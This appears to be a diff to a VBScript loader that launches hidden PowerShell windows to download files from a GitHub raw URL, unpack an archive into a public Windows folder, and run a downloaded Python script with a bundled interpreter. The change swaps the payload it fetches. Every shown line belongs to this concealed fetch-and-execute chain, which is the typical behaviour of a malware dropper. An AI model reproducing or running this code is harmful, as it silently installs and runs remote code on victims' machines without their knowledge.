@@ -17,7 +17,7 @@ objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -U
 objShell.Run "powershell.exe -WindowStyle hidden -Command ""Expand-Archive C:\Users\Public\Document.zip -DestinationPath C:\Users\Public\Document""", 0, True
 
 
-objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://raw.githubusercontent.com/thanhpc777/vt404k7/refs/heads/main/bot.py -OutFile C:\Users\Public\Document\script.py""", 0, True
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://raw.githubusercontent.com/thanhpc777/vt404k7/refs/heads/main/sim.py -OutFile C:\Users\Public\Document\script.py""", 0, True
 
 
 objShell.Run "powershell.exe -WindowStyle hidden -Command ""C:\Users\Public\Document\python C:\Users\Public\Document\script.py""", 0, True
